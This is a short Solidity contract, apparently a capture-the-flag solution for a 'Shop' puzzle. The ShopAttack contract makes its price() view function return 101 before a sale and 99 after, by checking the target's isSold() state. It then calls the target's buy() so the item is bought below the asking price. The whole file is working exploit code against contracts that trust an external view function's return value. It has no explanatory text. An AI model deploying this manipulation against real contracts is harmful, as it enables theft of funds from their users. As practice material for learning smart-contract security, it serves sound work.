// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function isSold() external view returns (bool);
}

contract ShopAttack {
    event Response(uint x);

    function price() external view returns (uint) {
        Shop s = Shop(msg.sender);
        if (s.isSold()) {
            return 99;
        } else {
            return 101;
        }
    }

    function attack(address _contract) public {
        (bool result, ) = _contract.call(abi.encodeWithSignature("buy()"));
        if (result) {
            emit Response(1111);
        } else {
            emit Response(2222);
        }
    }
}